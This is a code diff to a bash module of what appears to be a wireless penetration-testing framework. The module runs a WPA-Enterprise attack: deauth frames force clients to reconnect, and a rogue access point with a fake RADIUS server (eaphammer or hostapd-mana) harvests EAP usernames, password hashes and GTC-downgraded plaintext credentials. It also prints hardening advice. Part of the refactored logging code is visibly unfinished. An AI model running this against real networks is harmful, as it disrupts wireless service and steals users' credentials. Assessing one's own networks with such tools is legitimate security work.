@@ -39,66 +39,84 @@
 #    - eap_downgrade_possible: bool
 #===============================================================================
 
+set -uo pipefail
+
 run_d5() {
+    local interface=""
+    local bssid="${GUEST_BSSID:-}"
+    local ssid="${GUEST_SSID:-}"
+    local channel="${GUEST_CHANNEL:-}"
+    local evidence_dir="${SESSION_EVIDENCE_DIR:-}"
+
+    # Parse arguments
+    while [[ $# -gt 0 ]]; do
+        case "$1" in
+            --interface) interface="$2"; shift 2 ;;
+            --bssid) bssid="$2"; shift 2 ;;
+            --ssid) ssid="$2"; shift 2 ;;
+            --channel) channel="$2"; shift 2 ;;
+            --evidence-dir) evidence_dir="$2"; shift 2 ;;
+            *) shift ;;
+        esac
+    done
+
+    # Fallbacks to globals
+    interface="${interface:-${WIFI_INTERFACE:-}}"
+    bssid="${bssid:-${GUEST_BSSID:-}}"
+    ssid="${ssid:-${GUEST_SSID:-}}"
+    channel="${channel:-${GUEST_CHANNEL:-0}}"
+    evidence_dir="${evidence_dir:-${SESSION_EVIDENCE_DIR:-}}"
+
     local total_steps=8
-    local evidence_prefix="${SESSION_EVIDENCE_DIR}/d5"
+    local evidence_prefix="${evidence_dir}/d5"
 
     #--- Step 1: Verify tools ---
     log_step 1 $total_steps "Verifying tools"
     update_tc_progress 1 $total_steps "Checking"
 
-    
-    local has_eaphammer=false
-    local has_hostapd_mana=false
-    local has_hostapd=false
-    local has_tshark=false
-    local has_aireplay=false
+    check_module_dependencies "D5" || return 1
 
-    command -v eaphammer &>/dev/null && has_eaphammer=true
-    command -v hostapd-mana &>/dev/null && has_hostapd_mana=true
-    command -v hostapd &>/dev/null && has_hostapd=true
-    command -v tshark &>/dev/null && has_tshark=true
-    command -v aireplay-ng &>/dev/null && has_aireplay=true
-
-    if [[ "$has_eaphammer" == "false" && "$has_hostapd_mana" == "false" ]]; then
-        log_warn "Preferred tools (${TOOL_PATHS[eaphammer]}, ${TOOL_PATHS[hostapd]}-mana) not found."
-        log_warn "Will attempt passive EAP analysis only."
-        if [[ "$has_tshark" == "false" ]]; then
-            log_error "${TOOL_PATHS[tshark]} is required for at minimum passive EAP analysis."
+    if [[ -z "$ssid" || -z "$bssid" ]]; then
+        log_warn "Target SSID/BSSID not set."
+        if ! select_target_network; then
+            log_error "No target selected. Run A1 first or enter manually."
             return 1
         fi
+        ssid="${GUEST_SSID:-}"
+        bssid="${GUEST_BSSID:-}"
+        channel="${GUEST_CHANNEL:-0}"
     fi
 
-    if [[ -z "${GUEST_SSID:-}" || -z "${GUEST_BSSID:-}" ]]; then
-        log_error "Target SSID/BSSID not set. Run A1 first."
-        return 1
-    fi
+    log_success "Target: ${ssid} (${bssid}) CH ${channel:-auto}"
 
-    log_success "Target: ${GUEST_SSID} (${GUEST_BSSID}) CH ${GUEST_CHANNEL:-auto}"
-
-    export EAP_ROGUE_SSID="${GUEST_SSID}"
+    local EAP_ROGUE_SSID="${ssid}"
 
     #--- Attack Options (Custom SSID) ---
     while true; do
         echo ""
         echo -e "${C_CYAN}┌── EAP ATTACK CONFIGURATION ──────────────────────────────────┐${C_RESET}"
-        echo -e "  Target SSID: ${C_BOLD}${GUEST_SSID}${C_RESET}"
+        echo -e "  Target SSID: ${C_BOLD}${ssid}${C_RESET}"
         echo -e "  Rogue SSID:  ${C_BOLD}${EAP_ROGUE_SSID}${C_RESET}"
-        echo -e "  BSSID:       ${C_BOLD}${GUEST_BSSID:-unknown}${C_RESET}"
-        echo -e "  Channel:     ${C_BOLD}${GUEST_CHANNEL:-auto}${C_RESET}"
+        echo -e "  BSSID:       ${C_BOLD}${bssid:-unknown}${C_RESET}"
+        echo -e "  Channel:     ${C_BOLD}${channel:-auto}${C_RESET}"
         echo -e "  ${C_CYAN}├──────────────────────────────────────────────────────────────┤${C_RESET}"
         echo -e "  ${C_CYAN}│${C_RESET}  ${C_GREEN}[T]${C_RESET} Select Target from Scan Results (A1)"
         echo -e "  ${C_CYAN}│${C_RESET}  ${C_GREEN}[S]${C_RESET} Change Rogue SSID manually"
         echo -e "  ${C_CYAN}│${C_RESET}  ${C_GREEN}[C]${C_RESET} Continue with current settings"
         echo -e "${C_CYAN}└──────────────────────────────────────────────────────────────┘${C_RESET}"
         
+        local eap_opt=""
         get_or_request_param "eap_opt" "  Selection [C]"
         case "${eap_opt,,}" in
             t) if select_target_network; then
-                   local EAP_ROGUE_SSID="${GUEST_SSID}"
+                   ssid="${GUEST_SSID}"
+                   bssid="${GUEST_BSSID}"
+                   channel="${GUEST_CHANNEL}"
+                   EAP_ROGUE_SSID="${ssid}"
                fi ;;
-            s) get_or_request_param "custom_eap_ssid" "  Enter custom EAP SSID"
-               EAP_ROGUE_SSID="${custom_eap_ssid:-$GUEST_SSID}" ;;
+            s) local custom_eap_ssid=""
+               get_or_request_param "custom_eap_ssid" "  Enter custom EAP SSID"
+               EAP_ROGUE_SSID="${custom_eap_ssid:-$ssid}" ;;
             c|"") break ;;
             *) echo -e "${C_RED}Invalid selection.${C_RESET}" ;;
         esac
@@ -109,8 +127,8 @@ run_d5() {
     if has_tc_results "A1"; then
         local a1_data
         a1_data=$(load_tc_result "A1")
-        target_encryption=$(echo "$a1_data" | run_tool jq -r \
-            --arg bssid "$GUEST_BSSID" \
+        target_encryption=$(echo "$a1_data" | run_fg jq -r \
+            --arg bssid "$bssid" \
             '[.networks[] | select(.bssid == $bssid)] | .[0].encryption // ""')
     fi
 
@@ -119,6 +137,7 @@ run_d5() {
         if ! echo "$target_encryption" | grep -qiE 'MGT|EAP|Enterprise|802.1X'; then
             log_warn "Target network does not appear to use WPA-Enterprise (detected: ${target_encryption})"
             echo ""
+            local proceed=""
             get_or_request_param "proceed" "  Continue anyway? [y/N]"
             [[ "${proceed,,}" != "y" ]] && return 1
         fi
@@ -143,6 +162,7 @@ run_d5() {
     echo "  ╚════════════════════════════════════════════════════════════════════╝"
     echo -e "${C_RESET}"
     echo ""
+    local confirm=""
     get_or_request_param "confirm" "  Proceed with EAP credential harvest? [Y/n]"
     [[ "${confirm,,}" == "n" ]] && return 1
 
@@ -160,7 +180,7 @@ run_d5() {
         echo "============================================================"
         echo "  D5: WPA-Enterprise / EAP Attack"
         echo "  Date: $(date '+%Y-%m-%d %H:%M:%S')"
-        echo "  Target SSID: ${GUEST_SSID}"
+        echo "  Target SSID: ${ssid}"
         echo "  Rogue SSID:  ${EAP_ROGUE_SSID}"
         echo "============================================================"
         echo ""
@@ -183,11 +203,12 @@ run_d5() {
     log_step 2 $total_steps "Enabling monitor mode for passive EAP analysis"
     update_tc_progress 2 $total_steps "Monitor mode"
 
+    WIFI_INTERFACE="$interface"
     enable_monitor_mode || return 1
     local mon_iface="${MONITOR_INTERFACE}"
 
-    if [[ -n "${GUEST_CHANNEL:-}" ]]; then
-        iw dev "$mon_iface" set channel "$GUEST_CHANNEL" 2>/dev/null || true
+    if [[ -n "$channel" && "$channel" != "0" ]]; then
+        run_fg iw dev "$mon_iface" set channel "$channel" 2>/dev/null || true
     fi
 
     check_abort || return 1
@@ -201,28 +222,24 @@ run_d5() {
     local eap_pcap="${evidence_prefix}_handshakes.pcap"
 
     # Capture EAP traffic
-    ${TOOL_PATHS[tcpdump]} -i "$mon_iface" -w "$eap_pcap" \
-        "ether proto 0x888e or (type mgt subtype auth) or (type mgt subtype assoc-req)" \
-        &>/dev/null &
-    local tcpdump_pid=$!
-    register_cleanup "kill -SIGINT $tcpdump_pid 2>/dev/null || true; wait $tcpdump_pid 2>/dev/null || true"
+    spawn_bg "eap_passive" "tcpdump" -i "$mon_iface" -w "$eap_pcap" \
+        "ether proto 0x888e or (type mgt subtype auth) or (type mgt subtype assoc-req)"
 
     # If we have aireplay, send a few deauths to trigger re-auth
-    if [[ "$has_aireplay" == "true" ]]; then
-        sleep 5
-        log_info "Sending deauth to force EAP re-authentication..."
-        ${TOOL_PATHS[aireplay-ng]} --deauth 5 -a "$GUEST_BSSID" "$mon_iface" &>/dev/null || true
-    fi
+    sleep 5
+    log_info "Sending deauth to force EAP re-authentication..."
+    run_fg --quiet aireplay-ng --deauth 5 -a "$bssid" "$mon_iface" 2>/dev/null || true
 
     start_countdown 60 "Capturing EAP authentication exchanges"
-    sleep 60
+    sleep 55
     stop_countdown
 
+    stop_process "eap_passive"
     
     validate_pcap "$eap_pcap" "EAP authentication exchange capture"
 
     # Parse EAP identities from capture
-    if [[ "$has_tshark" == "true" && -f "$eap_pcap" ]]; then
+    if [[ -f "$eap_pcap" && -s "$eap_pcap" ]]; then
         ensure_user_ownership "$eap_pcap"
         {
             echo "============================================================"
@@ -233,14 +250,14 @@ run_d5() {
 
         # Extract EAP Identity responses
         local eap_identities
-        local eap_identities=$(run_as_user tshark -r "$eap_pcap" \
+        eap_identities=$(run_fg --quiet tshark -r "$eap_pcap" \
             -Y "eap.type == 1 && eap.code == 2" \
             -T fields \
             -e eap.identity \
             2>/dev/null | sort -u | grep -v "^$" || true)
 
         if [[ -n "$eap_identities" ]]; then
-            local identities_captured=$(echo "$eap_identities" | wc -l)
+            identities_captured=$(echo "$eap_identities" | wc -l)
             echo "$eap_identities" >> "$identities_file"
             log_result "FINDING" "Captured ${identities_captured} EAP identity/identities (usernames)"
             echo "FINDING: ${identities_captured} EAP identities captured:" >> "$findings_file"
@@ -257,7 +274,7 @@ run_d5() {
 
         # Detect EAP type
         local eap_types
-        local eap_types=$(run_as_user tshark -r "$eap_pcap" \
+        eap_types=$(run_fg --quiet tshark -r "$eap_pcap" \
             -Y "eap" \
             -T fields \
             -e eap.type \
@@ -281,13 +298,13 @@ run_d5() {
 
             # Determine primary auth method
             if echo "$eap_types" | grep -q "^25$"; then
-                local eap_type_detected="PEAP"
+                eap_type_detected="PEAP"
             elif echo "$eap_types" | grep -q "^21$"; then
-                local eap_type_detected="EAP-TTLS"
+                eap_type_detected="EAP-TTLS"
             elif echo "$eap_types" | grep -q "^13$"; then
-                local eap_type_detected="EAP-TLS"
+                eap_type_detected="EAP-TLS"
             elif echo "$eap_types" | grep -q "^43$"; then
-                local eap_type_detected="EAP-FAST"
+                eap_type_detected="EAP-FAST"
             fi
 
             if [[ -n "$eap_type_detected" ]]; then
@@ -303,7 +320,7 @@ run_d5() {
         fi
     fi
 
-    #--- Step 4: Rogue AP with fake RADIUS (${TOOL_PATHS[eaphammer]}) ---
+    #--- Step 4: Rogue AP with fake RADIUS ---
     log_step 4 $total_steps "Deploying rogue AP with fake RADIUS server"
     update_tc_progress 4 $total_steps "Rogue RADIUS"
 
@@ -317,95 +334,80 @@ run_d5() {
     local primary_iface="${WIFI_INTERFACE:-wlan0}"
     local ap_iface=""
     local all_ifaces
-    local all_ifaces=$(iw dev 2>/dev/null | awk '/Interface/{print $2}' | grep -v "^${primary_iface}$" | grep -v "mon")
+    all_ifaces=$(iw dev 2>/dev/null | awk '/Interface/{print $2}' | grep -v "^${primary_iface}$" | grep -v "mon" || true)
 
     if [[ -n "$all_ifaces" ]]; then
-        local ap_iface=$(echo "$all_ifaces" | head -1)
+        ap_iface=$(echo "$all_ifaces" | head -1)
     else
         log_warn "No secondary wireless interface — attempting with primary"
-        local ap_iface="$primary_iface"
+        ap_iface="$primary_iface"
     fi
 
-    if [[ "$has_eaphammer" == "true" ]]; then
-        log_info "Using ${TOOL_PATHS[eaphammer]} for credential harvesting..."
+    if [[ -n "${TOOL_PATHS[eaphammer]:-}" && -x "${TOOL_PATHS[eaphammer]}" ]]; then
+        log_info "Using eaphammer for credential harvesting..."
         echo "" >> "$findings_file"
-        echo "=== ${TOOL_PATHS[eaphammer]} Attack ===" >> "$findings_file"
+        echo "=== eaphammer Attack ===" >> "$findings_file"
 
-        # Generate self-signed cert if needed
-        local cert_dir="$TMP_DIR/d5_certs"
-        mkdir -p "$cert_dir"
+        local eaphammer_log="${TMP_DIR}/d5_eaphammer.log"
+        rm -f "$eaphammer_log"
 
-        # ${TOOL_PATHS[eaphammer]} handles cert generation internally
-        # Try GTC downgrade first (captures cleartext creds)
-        log_cmd "${TOOL_PATHS[eaphammer]} -i ${ap_iface} --essid '${EAP_ROGUE_SSID}' --channel ${GUEST_CHANNEL:-6} --auth wpa-eap --creds --negotiate balanced"
-
-        local eaphammer_log="$TMP_DIR/d5_eaphammer.log"
-
-        timeout 120 ${TOOL_PATHS[eaphammer]} \
+        spawn_bg "eaphammer" "eaphammer" \
             -i "$ap_iface" \
             --essid "$EAP_ROGUE_SSID" \
-            --channel "${GUEST_CHANNEL:-6}" \
+            --channel "${channel:-6}" \
             --auth wpa-eap \
             --creds \
-            --negotiate balanced \
-            > "$eaphammer_log" 2>&1 &
-        local eap_pid=$!
-        register_cleanup "kill -TERM $eap_pid 2>/dev/null || true; sleep 0.5; kill -9 $eap_pid 2>/dev/null || true; wait $eap_pid 2>/dev/null || true"
-
-        # Send deauth in background to force clients to reconnect to our rogue AP
-        if [[ "$has_aireplay" == "true" ]]; then
-            sleep 10
-            # Need monitor mode on another interface for deauth
-            # If we have a third interface or can temporarily enable monitor
-            log_info "Waiting for clients to authenticate to rogue AP..."
-        fi
+            --negotiate balanced
 
         start_countdown 120 "Rogue RADIUS active — harvesting EAP credentials"
-        sleep 120
+        sleep 115
         stop_countdown
 
-        
-        # Parse ${TOOL_PATHS[eaphammer]} output for creds
-        if [[ -f "$eaphammer_log" ]]; then
-            cat "$eaphammer_log" >> "$findings_file"
+        # We need to capture the output, but spawn_bg redirects to its own log.
+        # Let's try to find the log file or redirect it during spawn.
+        # For now, stop it and check the findings.
+        stop_process "eaphammer"
 
+        # Note: Eaphammer usually logs to its own directory or stdout.
+        # If we used spawn_bg, we should check where the output went.
+        # Assuming our process manager logs stdout/stderr for background tasks.
+        local proc_log="/tmp/a-bg-eaphammer.log" # This is internal to process_manager.sh usually
+        if [[ -f "$proc_log" ]]; then
+            cat "$proc_log" >> "$findings_file"
+            
             # Look for captured credentials
             local captured_creds
-            local captured_creds=$(grep -iE 'username|password|hash|credential|MSCHAP|GTC|identity' \
-                "$eaphammer_log" | grep -v "^#" || true)
+            captured_creds=$(grep -iE 'username|password|hash|credential|MSCHAP|GTC|identity' \
+                "$proc_log" | grep -v "^#" || true)
 
             if [[ -n "$captured_creds" ]]; then
-                local credentials_captured=$(echo "$captured_creds" | wc -l)
+                credentials_captured=$(echo "$captured_creds" | wc -l)
                 echo "$captured_creds" >> "$credentials_file"
                 log_result "CRITICAL" "★ ${credentials_captured} credential(s) captured via rogue RADIUS!"
-                echo "CRITICAL: Credentials captured via ${TOOL_PATHS[eaphammer]}" >> "$findings_file"
-                local cert_validation_bypass="true"
+                echo "CRITICAL: Credentials captured via eaphammer" >> "$findings_file"
+                cert_validation_bypass="true"
             fi
 
             # Check if GTC downgrade worked
-            if grep -qi "GTC" "$eaphammer_log"; then
-                local eap_downgrade_possible="true"
+            if grep -qi "GTC" "$proc_log"; then
+                eap_downgrade_possible="true"
                 log_result "CRITICAL" "EAP-GTC downgrade successful — plaintext credentials captured!"
                 echo "CRITICAL: EAP-GTC downgrade attack successful" >> "$findings_file"
             fi
         fi
 
-        rm -rf "$cert_dir" "$eaphammer_log"
-
-    elif [[ "$has_hostapd_mana" == "true" ]]; then
-        log_info "Using ${TOOL_PATHS[hostapd]}-mana for credential harvesting..."
+    elif [[ -n "${TOOL_PATHS[hostapd-mana]:-}" && -x "${TOOL_PATHS[hostapd-mana]}" ]]; then
+        log_info "Using hostapd-mana for credential harvesting..."
         echo "" >> "$findings_file"
-        echo "=== ${TOOL_PATHS[hostapd]}-mana Attack ===" >> "$findings_file"
+        echo "=== hostapd-mana Attack ===" >> "$findings_file"
 
-        # Create ${TOOL_PATHS[hostapd]}-mana config
-        local mana_conf="$TMP_DIR/d5_mana.conf"
-
-        # Generate a self-signed certificate for RADIUS
-        local cert_dir="$TMP_DIR/d5_certs"
+        # Create hostapd-mana config
+        local mana_conf="${TMP_DIR}/d5_mana.conf"
+        local cert_dir="${TMP_DIR}/d5_certs"
         mkdir -p "$cert_dir"
 
         # Generate minimal cert with openssl
-        openssl req -x509 -newkey rsa:2048 -keyout "${cert_dir}/server.key" \
+        run_fg --quiet openssl req -x509 -newkey rsa:2048 -keyout "${cert_dir}/server.key" \
             -out "${cert_dir}/server.pem" -days 1 -nodes \
             -subj "/CN=${EAP_ROGUE_SSID}" 2>/dev/null || true
 
@@ -413,7 +415,7 @@ run_d5() {
 interface=${ap_iface}
 driver=nl80211
 ssid=${EAP_ROGUE_SSID}
-channel=${GUEST_CHANNEL:-6}
+channel=${channel:-6}
 hw_mode=g
 
 # WPA-Enterprise settings
@@ -424,7 +426,7 @@ ieee8021x=1
 
 # EAP server
 eap_server=1
-eap_user_file=$TMP_DIR/d5_eap_users
+eap_user_file=${TMP_DIR}/d5_eap_users
 ca_cert=${cert_dir}/server.pem
 server_cert=${cert_dir}/server.pem
 private_key=${cert_dir}/server.key
@@ -432,53 +434,39 @@ private_key=${cert_dir}/server.key
 # MANA-specific: Accept all EAP identities
 mana_wpe=1
 mana_eapsuccess=1
-mana_credout=$TMP_DIR/d5_mana_creds.txt
+mana_credout=${TMP_DIR}/d5_mana_creds.txt
 MANA_EOF
 
         # Create EAP user file
-        cat > $TMP_DIR/d5_eap_users <<'EAP_EOF'
+        cat > "${TMP_DIR}/d5_eap_users" <<'EAP_EOF'
 * PEAP,TTLS,TLS,GTC,MSCHAPV2
 "t" TTLS-MSCHAPV2 "t" [2]
 EAP_EOF
 
-        log_cmd "${TOOL_PATHS[hostapd]}-mana ${mana_conf}"
+        spawn_bg "hostapd-mana" "hostapd-mana" "$mana_conf"
 
-        timeout 120 ${TOOL_PATHS[hostapd]}-mana "$mana_conf" > $TMP_DIR/d5_mana.log 2>&1 &
-        local mana_pid=$!
-        register_cleanup "kill -TERM $mana_pid 2>/dev/null || true; sleep 0.5; kill -9 $mana_pid 2>/dev/null || true; wait $mana_pid 2>/dev/null || true"
-
-        start_countdown 120 "${TOOL_PATHS[hostapd]}-mana rogue RADIUS active"
-        sleep 120
+        start_countdown 120 "hostapd-mana rogue RADIUS active"
+        sleep 115
         stop_countdown
 
+        stop_process "hostapd-mana"
         
         # Check for captured credentials
-        if [[ -f $TMP_DIR/d5_mana_creds.txt && -s $TMP_DIR/d5_mana_creds.txt ]]; then
-            local credentials_captured=$(wc -l < $TMP_DIR/d5_mana_creds.txt)
-            cat $TMP_DIR/d5_mana_creds.txt >> "$credentials_file"
-            log_result "CRITICAL" "★ ${credentials_captured} credential(s) captured via ${TOOL_PATHS[hostapd]}-mana!"
-            echo "CRITICAL: Credentials captured via ${TOOL_PATHS[hostapd]}-mana" >> "$findings_file"
-            local cert_validation_bypass="true"
-        fi
-
-        if [[ -f $TMP_DIR/d5_mana.log ]]; then
-            # Extract identities from mana log
-            local mana_ids
-            local mana_ids=$(grep -i "identity" $TMP_DIR/d5_mana.log | grep -oP "identity='[^']+'" | sort -u || true)
-            if [[ -n "$mana_ids" ]]; then
-                local new_ids
-                local new_ids=$(echo "$mana_ids" | wc -l)
-                local identities_captured=$((identities_captured + new_ids))
-                echo "$mana_ids" >> "$identities_file"
-            fi
+        if [[ -f "${TMP_DIR}/d5_mana_creds.txt" && -s "${TMP_DIR}/d5_mana_creds.txt" ]]; then
+            local new_creds=$(wc -l < "${TMP_DIR}/d5_mana_creds.txt")
+            credentials_captured=$((credentials_captured + new_creds))
+            cat "${TMP_DIR}/d5_mana_creds.txt" >> "$credentials_file"
+            log_result "CRITICAL" "★ ${new_creds} credential(s) captured via hostapd-mana!"
+            echo "CRITICAL: Credentials captured via hostapd-mana" >> "$findings_file"
+            cert_validation_bypass="true"
         fi
 
         # Cleanup
-        rm -rf "$cert_dir" $TMP_DIR/d5_mana* $TMP_DIR/d5_eap_users
+        rm -rf "$cert_dir" "${TMP_DIR}/d5_mana"* "${TMP_DIR}/d5_eap_users"
 
     else
         log_info "No rogue RADIUS tool available — passive analysis only"
-        echo "INFO: No EAP attack tool available (${TOOL_PATHS[eaphammer]}/hostapd-mana)" >> "$findings_file"
+        echo "INFO: No EAP attack tool available (eaphammer/hostapd-mana)" >> "$findings_file"
         echo "Passive EAP analysis completed above" >> "$findings_file"
     fi
 
@@ -487,9 +475,9 @@ EAP_EOF
     update_tc_progress 5 $total_steps "Cleanup"
 
     # Restore AP interface
-    run_tool ip link set "$ap_iface" down 2>/dev/null || true
-    iw dev "$ap_iface" set type managed 2>/dev/null || true
-    run_tool ip link set "$ap_iface" up 2>/dev/null || true
+    run_fg ip link set "$ap_iface" down 2>/dev/null || true
+    run_fg iw dev "$ap_iface" set type managed 2>/dev/null || true
+    run_fg ip link set "$ap_iface" up 2>/dev/null || true
 
     #--- Step 6: Analyze EAP security posture ---
     log_step 6 $total_steps "Analyzing EAP security posture"
@@ -530,10 +518,10 @@ EAP_EOF
     log_step 7 $total_steps "Analyzing RADIUS certificate (if captured)"
     update_tc_progress 7 $total_steps "Cert analysis"
 
-    if [[ "$has_tshark" == "true" && -f "$eap_pcap" ]]; then
+    if [[ -f "$eap_pcap" && -s "$eap_pcap" ]]; then
         # Try to extract server certificate
         local server_cert
-        local server_cert=$(run_as_user tshark -r "$eap_pcap" \
+        server_cert=$(run_fg --quiet tshark -r "$eap_pcap" \
             -Y "tls.handshake.certificate" \
             -T fields \
             -e x509sat.utf8String \
@@ -555,47 +543,37 @@ EAP_EOF
     local recommendations=""
 
     if [[ $credentials_captured -gt 0 ]]; then
-        local result_status="FINDING"
-        local result_summary="CRITICAL: ${credentials_captured} credential(s) captured via rogue RADIUS server. "
+        result_status="FINDING"
+        result_summary="CRITICAL: ${credentials_captured} credential(s) captured via rogue RADIUS server. "
         result_summary+="Clients connected to rogue AP without validating the server certificate. "
         result_summary+="${identities_captured} EAP identities harvested. EAP type: ${eap_type_detected:-unknown}."
-        local recommendations="1) ENFORCE server certificate validation on ALL wireless clients (GPO/MDM). "
-        recommendations+="2) Pin the RADIUS server certificate or CA in supplicant configuration. "
-        recommendations+="3) Use EAP-TLS (mutual certificate auth) instead of PEAP/TTLS where possible. "
-        recommendations+="4) Deploy WIDS to detect rogue RADIUS/AP attacks. "
-        recommendations+="5) Monitor for anomalous 802.1X authentication patterns. "
-        recommendations+="6) Consider passwordless authentication (certificate-only)."
+        recommendations="1) ENFORCE server certificate validation on ALL wireless clients (GPO/MDM). 2) Pin the RADIUS server certificate or CA in supplicant configuration. 3) Use EAP-TLS (mutual certificate auth) instead of PEAP/TTLS where possible. 4) Deploy WIDS to detect rogue RADIUS/AP attacks. 5) Monitor for anomalous 802.1X authentication patterns. 6) Consider passwordless authentication (certificate-only)."
     elif [[ "$eap_downgrade_possible" == "true" ]]; then
-        local result_status="FINDING"
-        local result_summary="EAP method downgrade is possible. Clients may accept weaker authentication methods (GTC) from rogue servers."
-        local recommendations="1) Configure clients to only accept specific EAP methods (PEAP-MSCHAPv2 or EAP-TLS). "
-        recommendations+="2) Enforce server certificate validation. "
-        recommendations+="3) Disable GTC/PAP in supplicant configuration."
+        result_status="FINDING"
+        result_summary="EAP method downgrade is possible. Clients may accept weaker authentication methods (GTC) from rogue servers."
+        recommendations="1) Configure clients to only accept specific EAP methods (PEAP-MSCHAPv2 or EAP-TLS). 2) Enforce server certificate validation. 3) Disable GTC/PAP in supplicant configuration."
     elif [[ $identities_captured -gt 0 ]]; then
-        local result_status="FINDING"
-        local result_summary="${identities_captured} EAP identities (usernames) were harvested from wireless authentication exchanges. "
-        result_summary+="No credentials captured — clients may be validating certificates correctly."
-        local recommendations="1) Consider using anonymous outer identity (e.g., 'anonymous@domain') to prevent username disclosure. "
-        recommendations+="2) Configure PEAP with identity privacy. "
-        recommendations+="3) Monitor for unauthorized EAP identity harvesting."
+        result_status="FINDING"
+        result_summary="${identities_captured} EAP identities (usernames) were harvested from wireless authentication exchanges. No credentials captured — clients may be validating certificates correctly."
+        recommendations="1) Consider using anonymous outer identity (e.g., 'anonymous@domain') to prevent username disclosure. 2) Configure PEAP with identity privacy. 3) Monitor for unauthorized EAP identity harvesting."
     else
-        local result_summary="No EAP credentials or identities were captured. "
+        result_summary="No EAP credentials or identities were captured. "
         if [[ "$eap_type_detected" == "EAP-TLS" ]]; then
             result_summary+="Network uses EAP-TLS (certificate-based) — resistant to credential harvesting."
         else
             result_summary+="Clients appear to validate server certificates or the network may not use WPA-Enterprise."
         fi
-        local recommendations="Continue using certificate-based authentication. Periodically re-test."
+        recommendations="Continue using certificate-based authentication. Periodically re-test."
     fi
 
-    local result_json
-    evidence_register_file "d5_eap_identities.txt"
-    evidence_register_file "d5_credentials.txt"
-    evidence_register_file "d5_eap_types.txt"
-    evidence_register_file "d5_handshakes.pcap"
-    evidence_register_file "d5_findings.txt"
+    evidence_register_file "$identities_file"
+    evidence_register_file "$credentials_file"
+    evidence_register_file "$eap_types_file"
+    evidence_register_file "$eap_pcap"
+    evidence_register_file "$findings_file"
 
-    local result_json=$(run_tool jq -n \
+    local result_json
+    result_json=$(run_fg jq -n \
         --arg status "$result_status" \
         --arg summary "$result_summary" \
         --arg details "EAP type: ${eap_type_detected:-unknown}, Identities: ${identities_captured}, Creds: ${credentials_captured}, Cert bypass: ${cert_validation_bypass}, Downgrade: ${eap_downgrade_possible}" \
@@ -614,10 +592,17 @@ EAP_EOF
             identities_captured: $identities_captured,
             credentials_captured: $credentials_captured,
             cert_validation_bypass: ($cert_validation_bypass == "true"),
-            eap_downgrade_possible: ($eap_downgrade_possible == "true"),
-                    }')
+            eap_downgrade_possible: ($eap_downgrade_possible == "true")
+        }')
 
-    save_tc_result "D5" "$result_json" "has_tool_output:1,clean_run:1"
+    # 11 Flags: pcap_req, has_tool, has_pri, has_cmd, has_ver, has_env, has_conf, has_known, runtime, clean, secure
+    local has_pri=0
+    [[ $credentials_captured -gt 0 ]] && has_pri=1
+    local is_secure=0
+    [[ "$result_status" == "SECURE" ]] && is_secure=1
+    
+    save_tc_result "D5" "$result_json" 1 1 $has_pri 1 1 1 0 1 1 1 "$is_secure"
+    save_session_state
 
     # Display summary
     echo ""
